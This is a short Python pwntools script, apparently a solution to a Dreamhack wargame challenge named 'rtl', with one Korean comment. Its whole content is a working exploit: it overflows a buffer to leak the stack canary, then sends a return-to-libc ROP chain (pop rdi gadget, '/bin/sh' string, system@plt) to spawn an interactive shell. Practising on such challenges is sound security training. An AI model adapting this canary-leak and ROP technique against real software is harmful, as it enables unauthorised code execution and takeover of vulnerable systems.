from pwn import *

p = process("./rtl")
#p=remote("host3.dreamhack.games",8444)
#print(f"PID : {p.pid}")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

e = ELF("./rtl")
r = ROP("./rtl")

# Canary leak
payload = b'a' * 0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary=u64(b'\x00' + p.recvn(7))
slog('canary', canary)

plt = e.plt["system"]
slog("plt", plt)

binsh = next(e.search(b"/bin/sh"))
slog("binsh", binsh)

pop = r.find_gadget(["pop rdi"])[0]
ret = r.find_gadget(["ret"])[0]
slog("pop", pop)
slog("ret", ret)

#shell 획득
payload = b'a' * 0x38
payload += p64(canary)
payload += b'a' * 0x8
payload += p64(pop)
payload += p64(binsh)
payload += p64(ret)
payload += p64(plt)

p.sendafter(b'Buf: ', payload)

p.interactive()
